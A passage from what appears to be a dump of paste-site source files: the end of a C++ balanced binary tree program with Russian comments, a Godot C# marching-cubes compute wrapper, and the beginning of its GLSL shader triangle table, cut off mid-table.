    node* r;
    int val;

    node(node* par) : parent(par), l(nullptr), r(nullptr), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), val(inf) {}
};

struct tree {
    //vector<int> arr; // используется ТОЛЬКО для инициализации дерева
    node* main_root; // Изменен на указатель для удобства
    int cur_size = 0;

    // Создает поддерево
    node* create_subtree(node* par, int Li, int Ri, const vector <int> &arr) {
        if (Li > Ri) return nullptr; // Проверка на правильные границы

        node* root = new node(par);
        root->val = arr[(Ri + Li) / 2]; // устанавливаем значение корня

        // Создание левого и правого поддеревьев
        root->l = create_subtree(root, Li, (Ri + Li) / 2 - 1, arr);
        root->r = create_subtree(root, (Ri + Li) / 2 + 1, Ri, arr);

        return root; // Возвращаем указатель на созданный узел
    }

    // Инициализация дерева
    void create(const vector <int> &arr) {
        cur_size = arr.size();
        if (arr.size() == 0) {
            main_root = nullptr; // В случае пустого массива
        } else {
            main_root = create_subtree(nullptr, 0, arr.size() - 1, arr);
        }
        cout << ""Tree created\n"";
    }

    // Обход дерева (in-order)
    void trav(node* root) {
        if (root == nullptr) return; // Проверка на nullptr
        trav(root->l); // Обход левого поддерева
        cout << root->val << "" ""; // Обработка текущего узла
        trav(root->r); // Обход правого поддерева
    }

    void replace_el(node* root, int Li, int Ri, int i, int x) {
        if (root == nullptr) return;

        int mid = (Li + Ri) / 2;
        if (i == mid) {  // Нашли узел, который нужно заменить
            root->val = x;
            return;
        }

        if (i < mid) {
            replace_el(root->l, Li, mid - 1, i, x);  // Ищем в левом поддереве
        } else {
            replace_el(root->r, mid + 1, Ri, i, x);  // Ищем в правом поддереве
        }
    }
};

int main() {
    tree T;
    vector<int> a = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21};
    T.create(a);
    cout << ""TRAVERSAL ORDER:\n"";
    T.trav(T.main_root); cout << ""\n"";
    /*T.replace_el(T.main_root, 0, T.cur_size - 1, 0, 999);
    T.trav(T.main_root); cout << ""\n"";
    T.replace_el(T.main_root, 0, T.cur_size - 1, 18, 999);
    T.trav(T.main_root); cout << ""\n"";*/
    for (int i = 0; i < 21; ++i) {
        T.replace_el(T.main_root, 0, T.cur_size - 1, i, 999);
        T.trav(T.main_root); cout << ""\n"";
    }

    // Освобождение памяти
    // Здесь может быть реализована функция для удаления дерева и освобождения памяти
    return 0;
}
"
Dq3CGrje,MarchingCubes.cs,Fiskmans,C#,Saturday 19th of April 2025 03:33:04 AM CDT,"internal class MarchingCubes
{
    RenderingDevice myRenderDevice;
    Vector3I mySize;
    uint myMaxTris;
    byte[] myCPUNodeData;
    int myDataSize;
    byte[] myCPUTriData;
    int myTriDataSize;
    static readonly int StaticDataSize = sizeof(uint) * 4;
    static readonly int UniformDataSize = sizeof(uint);

    Rid myComputeShaderId;

    Rid myGPUStaticBufferId;
    Rid myGPUUniformBufferId;
    Rid myGPUDataBufferId;

    Rid myGPUTriBufferOutputId;
    Rid myUniformSetId;
    Rid myPipelineId;

    public MarchingCubes(Vector3I aSize)
    {
        myRenderDevice = RenderingServer.CreateLocalRenderingDevice();
        mySize = aSize;
        myDataSize = Utils.CountPoints(aSize) * sizeof(int);
        myMaxTris = (uint)Math.Max(Utils.CountPoints(aSize - Vector3I.One), 64);
        myTriDataSize = (int)myMaxTris * sizeof(float) * 3 * 3;

        myCPUNodeData = new byte[myDataSize];
        myCPUTriData = new byte[myTriDataSize];


        // Load GLSL shader
        RDShaderFile shaderFile = GD.Load<RDShaderFile>(""res://Shaders/Compute/MarchingCubes.glsl"");
        RDShaderSpirV shaderBytecode = shaderFile.GetSpirV();
        myComputeShaderId = myRenderDevice.ShaderCreateFromSpirV(shaderBytecode);

        uint[] staticData = [(uint)aSize.X, (uint)aSize.Y, (uint)aSize.Z, (uint)myMaxTris];
        byte[] staticDataRaw = new byte[StaticDataSize];

        Buffer.BlockCopy(staticData, 0, staticDataRaw, 0, StaticDataSize);

        myGPUStaticBufferId = myRenderDevice.StorageBufferCreate((uint)StaticDataSize, staticDataRaw);
        myGPUUniformBufferId = myRenderDevice.StorageBufferCreate((uint)UniformDataSize);
        myGPUDataBufferId = myRenderDevice.StorageBufferCreate((uint)myCPUNodeData.Length);
        myGPUTriBufferOutputId = myRenderDevice.StorageBufferCreate((uint)myCPUTriData.Length);

        RDUniform staticDataBinding = new RDUniform { UniformType = RenderingDevice.UniformType.StorageBuffer, Binding = 0 };
        staticDataBinding.AddId(myGPUStaticBufferId);

        RDUniform uniformDatabinding = new RDUniform { UniformType = RenderingDevice.UniformType.StorageBuffer, Binding = 1 };
        uniformDatabinding.AddId(myGPUUniformBufferId);

        RDUniform dataBinding = new RDUniform { UniformType = RenderingDevice.UniformType.StorageBuffer, Binding = 2 };
        dataBinding.AddId(myGPUDataBufferId);

        RDUniform triOutputbinding = new RDUniform { UniformType = RenderingDevice.UniformType.StorageBuffer, Binding = 3 };
        triOutputbinding.AddId(myGPUTriBufferOutputId);

        myUniformSetId = myRenderDevice.UniformSetCreate([staticDataBinding, uniformDatabinding, dataBinding, triOutputbinding], myComputeShaderId, 0);

        myPipelineId = myRenderDevice.ComputePipelineCreate(myComputeShaderId);
        // TODO: do this
    }


    public Godot.Vector3[] Calculate(int[,,] aValues, uint aSurface = 128, float aScale = 1.0f)
    {
        if (aValues.GetLength(0) != mySize.X) { throw new ArgumentException(""X-Axis size missmatch""); }
        if (aValues.GetLength(1) != mySize.Y) { throw new ArgumentException(""Y-Axis size missmatch""); }
        if (aValues.GetLength(2) != mySize.Z) { throw new ArgumentException(""Z-Axis size missmatch""); }

        uint[] uniformData = [aSurface];
        byte[] uniformRaw = new byte[uniformData.Length * sizeof(uint)];
        Buffer.BlockCopy(uniformData, 0, uniformRaw, 0, uniformRaw.Length);

        myRenderDevice.BufferUpdate(myGPUUniformBufferId, 0, (uint)UniformDataSize, uniformRaw);

        Buffer.BlockCopy(aValues, 0, myCPUNodeData, 0, myDataSize);
        myRenderDevice.BufferUpdate(myGPUDataBufferId, 0, (uint)myCPUNodeData.Length, myCPUNodeData);

        long computeListIndex = myRenderDevice.ComputeListBegin();
        myRenderDevice.ComputeListBindComputePipeline(computeListIndex, myPipelineId);
        myRenderDevice.ComputeListBindUniformSet(computeListIndex, myUniformSetId, 0);
        myRenderDevice.ComputeListDispatch(computeListIndex, xGroups: (uint)mySize.X - 1, yGroups: (uint)mySize.Y - 1, zGroups: (uint)mySize.Z - 1);
        myRenderDevice.ComputeListEnd();

        myRenderDevice.Submit();
        myRenderDevice.Sync();

        byte[] outputBytes = myRenderDevice.BufferGetData(myGPUTriBufferOutputId);

        float[] resultFloats = new float[12 /*TODO figure this one out assumes one tri for now*/];

        Buffer.BlockCopy(outputBytes, 0, resultFloats, 0, resultFloats.Length * sizeof(float));

        Godot.Vector3[] result = new Godot.Vector3[resultFloats.Length / 4];

        for (int i = 0; i < result.Length; i++)
        {
            result[i] = new Godot.Vector3(resultFloats[i * 4 + 0], resultFloats[i * 4 + 1], resultFloats[i * 4 + 2]);
        }

        return result;
    }

}"
wDQsJ8fB,MarchingCubes.glsl,Fiskmans,Godot GLSL,Saturday 19th of April 2025 03:31:39 AM CDT,"#[compute]
#version 450

// Invocations in the (x, y, z) dimension
layout(local_size_x = 1, local_size_y = 1, local_size_z = 1) in;

layout(set = 0, binding = 0, std430) restrict buffer InputStatic
{
    uvec3 Size;
    uint MaxTris;
};

layout(set = 0, binding = 1, std430) restrict buffer InputUniform
{
    uint Surface;
};

layout(set = 0, binding = 2, std430) restrict buffer Input 
{
    int NodeData[];
};

shared uint TriCount;

struct Tri
{
    vec4 a;
    vec4 b;
    vec4 c;
};

layout(set = 0, binding = 3, std430) restrict buffer Output
{
    Tri Tris[];
};

// blame the source for weird order
// Adaptation of https://paulbourke.net/geometry/polygonise/
const uvec3[8] Corners = uvec3[8]
(
    uvec3(0, 0, 0),
    uvec3(1, 0, 0),
    uvec3(1, 1, 0),
    uvec3(0, 1, 0),
    uvec3(0, 0, 1),
    uvec3(1, 0, 1),
    uvec3(1, 1, 1),
    uvec3(0, 1, 1)
);

const int[256][16] TriTable = int[256][16] (
    int[16](-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  8,  3, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  1,  9, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  8,  3,  9,  8,  1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  2, 10, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  8,  3,  1,  2, 10, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 9,  2, 10,  0,  2,  9, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 2,  8,  3,  2, 10,  8, 10,  9,  8, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 3, 11,  2, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0, 11,  2,  8, 11,  0, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  9,  0,  2,  3, 11, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1, 11,  2,  1,  9, 11,  9,  8, 11, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 3, 10,  1, 11, 10,  3, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0, 10,  1,  0,  8, 10,  8, 11, 10, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 3,  9,  0,  3, 11,  9, 11, 10,  9, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 9,  8, 10, 10,  8, 11, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),  // 0x10
	int[16]( 4,  7,  8, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 4,  3,  0,  7,  3,  4, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  1,  9,  8,  4,  7, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 4,  1,  9,  4,  7,  1,  7,  3,  1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  2, 10,  8,  4,  7, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 3,  4,  7,  3,  0,  4,  1,  2, 10, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 9,  2, 10,  9,  0,  2,  8,  4,  7, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 2, 10,  9,  2,  9,  7,  2,  7,  3,  7,  9,  4, -1, -1, -1, -1),
    int[16]( 8,  4,  7,  3, 11,  2, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16](11,  4,  7, 11,  2,  4,  2,  0,  4, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 9,  0,  1,  8,  4,  7,  2,  3, 11, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 4,  7, 11,  9,  4, 11,  9, 11,  2,  9,  2,  1, -1, -1, -1, -1),
    int[16]( 3, 10,  1,  3, 11, 10,  7,  8,  4, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1, 11, 10,  1,  4, 11,  1,  0,  4,  7, 11,  4, -1, -1, -1, -1),
    int[16]( 4,  7,  8,  9,  0, 11,  9, 11, 10, 11,  0,  3, -1, -1, -1, -1),
    int[16]( 4,  7, 11,  4, 11,  9,  9, 11, 10, -1, -1, -1, -1, -1, -1, -1),  // 0x20
	int[16]( 9,  5,  4, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 9,  5,  4,  0,  8,  3, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  5,  4,  1,  5,  0, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 8,  5,  4,  8,  3,  5,  3,  1,  5, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  2, 10,  9,  5,  4, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 3,  0,  8,  1,  2, 10,  4,  9,  5, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 5,  2, 10,  5,  4,  2,  4,  0,  2, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 2, 10,  5,  3,  2,  5,  3,  5,  4,  3,  4,  8, -1, -1, -1, -1),
    int[16]( 9,  5,  4,  2,  3, 11, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0, 11,  2,  0,  8, 11,  4,  9,  5, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  5,  4,  0,  1,  5,  2,  3, 11, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 2,  1,  5,  2,  5,  8,  2,  8, 11,  4,  8,  5, -1, -1, -1, -1),
    int[16](10,  3, 11, 10,  1,  3,  9,  5,  4, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 4,  9,  5,  0,  8,  1,  8, 10,  1,  8, 11, 10, -1, -1, -1, -1),
    int[16]( 5,  4,  0,  5,  0, 11,  5, 11, 10, 11,  0,  3, -1, -1, -1, -1),
    int[16]( 5,  4,  8,  5,  8, 10, 10,  8, 11, -1, -1, -1, -1, -1, -1, -1),  // 0x30
	int[16]( 9,  7,  8,  5,  7,  9, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 9,  3,  0,  9,  5,  3,  5,  7,  3, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  7,  8,  0,  1,  7,  1,  5,  7, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  5,  3,  3,  5,  7, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 9,  7,  8,  9,  5,  7, 10,  1,  2, -1, -1, -1, -1, -1, -1, -1),
    int[16](10,  1,  2,  9,  5,  0,  5,  3,  0,  5,  7,  3, -1, -1, -1, -1),
    int[16]( 8,  0,  2,  8,  2,  5,  8,  5,  7, 10,  5,  2, -1, -1, -1, -1),
    int[16]( 2, 10,  5,  2,  5,  3,  3,  5,  7, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 7,  9,  5,  7,  8,  9,  3, 11,  2, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 9,  5,  7,  9,  7,  2,  9,  2,  0,  2,  7, 11, -1, -1, -1, -1),
    int[16]( 2,  3, 11,  0,  1,  8,  1,  7,  8,  1,  5,  7, -1, -1, -1, -1),
    int[16](11,  2,  1, 11,  1,  7,  7,  1,  5, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 9,  5,  8,  8,  5,  7, 10,  1,  3, 10,  3, 11, -1, -1, -1, -1),
    int[16]( 5,  7,  0,  5,  0,  9,  7, 11,  0,  1,  0, 10, 11, 10,  0, -1),
    int[16](11, 10,  0, 11,  0,  3, 10,  5,  0,  8,  0,  7,  5,  7,  0, -1),
    int[16](11, 10,  5,  7, 11,  5, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),  // 0x40
	int[16](10,  6,  5, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  8,  3,  5, 10,  6, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 9,  0,  1,  5, 10,  6, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  8,  3,  1,  9,  8,  5, 10,  6, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  6,  5,  2,  6,  1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  6,  5,  1,  2,  6,  3,  0,  8, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 9,  6,  5,  9,  0,  6,  0,  2,  6, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 5,  9,  8,  5,  8,  2,  5,  2,  6,  3,  2,  8, -1, -1, -1, -1),
    int[16]( 2,  3, 11, 10,  6,  5, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16](11,  0,  8, 11,  2,  0, 10,  6,  5, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  1,  9,  2,  3, 11,  5, 10,  6, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 5, 10,  6,  1,  9,  2,  9, 11,  2,  9,  8, 11, -1, -1, -1, -1),
    int[16]( 6,  3, 11,  6,  5,  3,  5,  1,  3, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  8, 11,  0, 11,  5,  0,  5,  1,  5, 11,  6, -1, -1, -1, -1),
    int[16]( 3, 11,  6,  0,  3,  6,  0,  6,  5,  0,  5,  9, -1, -1, -1, -1),
    int[16]( 6,  5,  9,  6,  9, 11, 11,  9,  8, -1, -1, -1, -1, -1, -1, -1),  // 0x50
	int[16]( 5, 10,  6,  4,  7,  8, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 4,  3,  0,  4,  7,  3,  6,  5, 10, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  9,  0,  5, 10,  6,  8,  4,  7, -1, -1, -1, -1, -1, -1, -1),
    int[16](10,  6,  5,  1,  9,  7,  1,  7,  3,  7,  9,  4, -1, -1, -1, -1),
    int[16]( 6,  1,  2,  6,  5,  1,  4,  7,  8, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  2,  5,  5,  2,  6,  3,  0,  4,  3,  4,  7, -1, -1, -1, -1),
    int[16]( 8,  4,  7,  9,  0,  5,  0,  6,  5,  0,  2,  6, -1, -1, -1, -1),
    int[16]( 7,  3,  9,  7,  9,  4,  3,  2,  9,  5,  9,  6,  2,  6,  9, -1),
    int[16]( 3, 11,  2,  7,  8,  4, 10,  6,  5, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 5, 10,  6,  4,  7,  2,  4,  2,  0,  2,  7, 11, -1, -1, -1, -1),
    int[16]( 0,  1,  9,  4,  7,  8,  2,  3, 11,  5, 10,  6, -1, -1, -1, -1),
    int[16]( 9,  2,  1,  9, 11,  2,  9,  4, 11,  7, 11,  4,  5, 10,  6, -1),
    int[16]( 8,  4,  7,  3, 11,  5,  3,  5,  1,  5, 11,  6, -1, -1, -1, -1),
    int[16]( 5,  1, 11,  5, 11,  6,  1,  0, 11,  7, 11,  4,  0,  4, 11, -1),
    int[16]( 0,  5,  9,  0,  6,  5,  0,  3,  6, 11,  6,  3,  8,  4,  7, -1),
    int[16]( 6,  5,  9,  6,  9, 11,  4,  7,  9,  7, 11,  9, -1, -1, -1, -1),  // 0x60
	int[16](10,  4,  9,  6,  4, 10, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 4, 10,  6,  4,  9, 10,  0,  8,  3, -1, -1, -1, -1, -1, -1, -1),
    int[16](10,  0,  1, 10,  6,  0,  6,  4,  0, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 8,  3,  1,  8,  1,  6,  8,  6,  4,  6,  1, 10, -1, -1, -1, -1),
    int[16]( 1,  4,  9,  1,  2,  4,  2,  6,  4, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 3,  0,  8,  1,  2,  9,  2,  4,  9,  2,  6,  4, -1, -1, -1, -1),
    int[16]( 0,  2,  4,  4,  2,  6, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 8,  3,  2,  8,  2,  4,  4,  2,  6, -1, -1, -1, -1, -1, -1, -1),
    int[16](10,  4,  9, 10,  6,  4, 11,  2,  3, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  8,  2,  2,  8, 11,  4,  9, 10,  4, 10,  6, -1, -1, -1, -1),
    int[16]( 3, 11,  2,  0,  1,  6,  0,  6,  4,  6,  1, 10, -1, -1, -1, -1),
    int[16]( 6,  4,  1,  6,  1, 10,  4,  8,  1,  2,  1, 11,  8, 11,  1, -1),
    int[16]( 9,  6,  4,  9,  3,  6,  9,  1,  3, 11,  6,  3, -1, -1, -1, -1),
    int[16]( 8, 11,  1,  8,  1,  0, 11,  6,  1,  9,  1,  4,  6,  4,  1, -1),
    int[16]( 3, 11,  6,  3,  6,  0,  0,  6,  4, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 6,  4,  8, 11,  6,  8, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),  // 0x70
	int[16]( 7, 10,  6,  7,  8, 10,  8,  9, 10, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  7,  3,  0, 10,  7,  0,  9, 10,  6,  7, 10, -1, -1, -1, -1),
    int[16](10,  6,  7,  1, 10,  7,  1,  7,  8,  1,  8,  0, -1, -1, -1, -1),
    int[16](10,  6,  7, 10,  7,  1,  1,  7,  3, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  2,  6,  1,  6,  8,  1,  8,  9,  8,  6,  7, -1, -1, -1, -1),
    int[16]( 2,  6,  9,  2,  9,  1,  6,  7,  9,  0,  9,  3,  7,  3,  9, -1),
    int[16]( 7,  8,  0,  7,  0,  6,  6,  0,  2, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 7,  3,  2,  6,  7,  2, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 2,  3, 11, 10,  6,  8, 10,  8,  9,  8,  6,  7, -1, -1, -1, -1),
    int[16]( 2,  0,  7,  2,  7, 11,  0,  9,  7,  6,  7, 10,  9, 10,  7, -1),
    int[16]( 1,  8,  0,  1,  7,  8,  1, 10,  7,  6,  7, 10,  2,  3, 11, -1),
    int[16](11,  2,  1, 11,  1,  7, 10,  6,  1,  6,  7,  1, -1, -1, -1, -1),
    int[16]( 8,  9,  6,  8,  6,  7,  9,  1,  6, 11,  6,  3,  1,  3,  6, -1),
    int[16]( 0,  9,  1, 11,  6,  7, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 7,  8,  0,  7,  0,  6,  3, 11,  0, 11,  6,  0, -1, -1, -1, -1),
    int[16]( 7, 11,  6, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),  // 0x80
	int[16]( 7,  6, 11, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 3,  0,  8, 11,  7,  6, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  1,  9, 11,  7,  6, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 8,  1,  9,  8,  3,  1, 11,  7,  6, -1, -1, -1, -1, -1, -1, -1),
    int[16](10,  1,  2,  6, 11,  7, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  2, 10,  3,  0,  8,  6, 11,  7, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 2,  9,  0,  2, 10,  9,  6, 11,  7, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 6, 11,  7,  2, 10,  3, 10,  8,  3, 10,  9,  8, -1, -1, -1, -1),
    int[16]( 7,  2,  3,  6,  2,  7, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 7,  0,  8,  7,  6,  0,  6,  2,  0, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 2,  7,  6,  2,  3,  7,  0,  1,  9, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  6,  2,  1,  8,  6,  1,  9,  8,  8,  7,  6, -1, -1, -1, -1),
    int[16](10,  7,  6, 10,  1,  7,  1,  3,  7, -1, -1, -1, -1, -1, -1, -1),
    int[16](10,  7,  6,  1,  7, 10,  1,  8,  7,  1,  0,  8, -1, -1, -1, -1),
    int[16]( 0,  3,  7,  0,  7, 10,  0, 10,  9,  6, 10,  7, -1, -1, -1, -1),
    int[16]( 7,  6, 10,  7, 10,  8,  8, 10,  9, -1, -1, -1, -1, -1, -1, -1),  // 0x90
	int[16]( 6,  8,  4, 11,  8,  6, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 3,  6, 11,  3,  0,  6,  0,  4,  6, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 8,  6, 11,  8,  4,  6,  9,  0,  1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 9,  4,  6,  9,  6,  3,  9,  3,  1, 11,  3,  6, -1, -1, -1, -1),
    int[16]( 6,  8,  4,  6, 11,  8,  2, 10,  1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  2, 10,  3,  0, 11,  0,  6, 11,  0,  4,  6, -1, -1, -1, -1),
    int[16]( 4, 11,  8,  4,  6, 11,  0,  2,  9,  2, 10,  9, -1, -1, -1, -1),
    int[16](10,  9,  3, 10,  3,  2,  9,  4,  3, 11,  3,  6,  4,  6,  3, -1),
    int[16]( 8,  2,  3,  8,  4,  2,  4,  6,  2, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  4,  2,  4,  6,  2, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1), // this one
	int[16]( 1,  9,  0,  2,  3,  4,  2,  4,  6,  4,  3,  8, -1, -1, -1, -1),
    int[16]( 1,  9,  4,  1,  4,  2,  2,  4,  6, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 8,  1,  3,  8,  6,  1,  8,  4,  6,  6, 10,  1, -1, -1, -1, -1),
    int[16](10,  1,  0, 10,  0,  6,  6,  0,  4, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 4,  6,  3,  4,  3,  8,  6, 10,  3,  0,  3,  9, 10,  9,  3, -1),
    int[16](10,  9,  4,  6, 10,  4, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),  // 0xA0
	int[16]( 4,  9,  5,  7,  6, 11, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  8,  3,  4,  9,  5, 11,  7,  6, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 5,  0,  1,  5,  4,  0,  7,  6, 11, -1, -1, -1, -1, -1, -1, -1),
    int[16](11,  7,  6,  8,  3,  4,  3,  5,  4,  3,  1,  5, -1, -1, -1, -1),
    int[16]( 9,  5,  4, 10,  1,  2,  7,  6, 11, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 6, 11,  7,  1,  2, 10,  0,  8,  3,  4,  9,  5, -1, -1, -1, -1),
    int[16]( 7,  6, 11,  5,  4, 10,  4,  2, 10,  4,  0,  2, -1, -1, -1, -1),
    int[16]( 3,  4,  8,  3,  5,  4,  3,  2,  5, 10,  5,  2, 11,  7,  6, -1),
    int[16]( 7,  2,  3,  7,  6,  2,  5,  4,  9, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 9,  5,  4,  0,  8,  6,  0,  6,  2,  6,  8,  7, -1, -1, -1, -1),
    int[16]( 3,  6,  2,  3,  7,  6,  1,  5,  0,  5,  4,  0, -1, -1, -1, -1),
    int[16]( 6,  2,  8,  6,  8,  7,  2,  1,  8,  4,  8,  5,  1,  5,  8, -1),
    int[16]( 9,  5,  4, 10,  1,  6,  1,  7,  6,  1,  3,  7, -1, -1, -1, -1),
    int[16]( 1,  6, 10,  1,  7,  6,  1,  0,  7,  8,  7,  0,  9,  5,  4, -1),
    int[16]( 4,  0, 10,  4, 10,  5,  0,  3, 10,  6, 10,  7,  3,  7, 10, -1),
    int[16]( 7,  6, 10,  7, 10,  8,  5,  4, 10,  4,  8, 10, -1, -1, -1, -1),  // 0xB0
	int[16]( 6,  9,  5,  6, 11,  9, 11,  8,  9, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 3,  6, 11,  0,  6,  3,  0,  5,  6,  0,  9,  5, -1, -1, -1, -1),
    int[16]( 0, 11,  8,  0,  5, 11,  0,  1,  5,  5,  6, 11, -1, -1, -1, -1),
    int[16]( 6, 11,  3,  6,  3,  5,  5,  3,  1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  2, 10,  9,  5, 11,  9, 11,  8, 11,  5,  6, -1, -1, -1, -1),
    int[16]( 0, 11,  3,  0,  6, 11,  0,  9,  6,  5,  6,  9,  1,  2, 10, -1),
    int[16](11,  8,  5, 11,  5,  6,  8,  0,  5, 10,  5,  2,  0,  2,  5, -1),
    int[16]( 6, 11,  3,  6,  3,  5,  2, 10,  3, 10,  5,  3, -1, -1, -1, -1),
    int[16]( 5,  8,  9,  5,  2,  8,  5,  6,  2,  3,  8,  2, -1, -1, -1, -1),
    int[16]( 9,  5,  6,  9,  6,  0,  0,  6,  2, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  5,  8,  1,  8,  0,  5,  6,  8,  3,  8,  2,  6,  2,  8, -1),
    int[16]( 1,  5,  6,  2,  1,  6, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  3,  6,  1,  6, 10,  3,  8,  6,  5,  6,  9,  8,  9,  6, -1),
    int[16](10,  1,  0, 10,  0,  6,  9,  5,  0,  5,  6,  0, -1, -1, -1, -1),
    int[16]( 0,  3,  8,  5,  6, 10, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16](10,  5,  6, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),  // 0xC0
	int[16](11,  5, 10,  7,  5, 11, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16](11,  5, 10, 11,  7,  5,  8,  3,  0, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 5, 11,  7,  5, 10, 11,  1,  9,  0, -1, -1, -1, -1, -1, -1, -1),
    int[16](10,  7,  5, 10, 11,  7,  9,  8,  1,  8,  3,  1, -1, -1, -1, -1),
    int[16](11,  1,  2, 11,  7,  1,  7,  5,  1, -1, -1, -1, -1, -1, -1, -1),
